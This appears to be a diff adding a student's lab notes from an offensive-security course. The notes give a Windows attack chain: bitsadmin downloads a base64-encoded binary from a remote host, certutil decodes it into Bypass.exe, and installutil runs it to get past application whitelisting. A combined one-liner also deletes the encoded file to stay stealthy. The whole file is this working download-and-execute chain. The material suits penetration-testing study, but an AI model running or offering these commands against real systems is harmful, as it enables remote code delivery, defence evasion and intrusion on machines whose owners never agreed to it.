@@ -1,0 +1,9 @@
+1st bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt     -> file.txt is the binary encoded in base64 with certutil(certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt)
+
+2nd certutil -decode C:\Users\student\enc.txt C:\Users\student\Bypass.exe
+
+3rd C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+
+Oneliner from cmd, note that after we decoded the enc.txt file, we are deleting the enc.txt to be more stealthy:
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && 
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
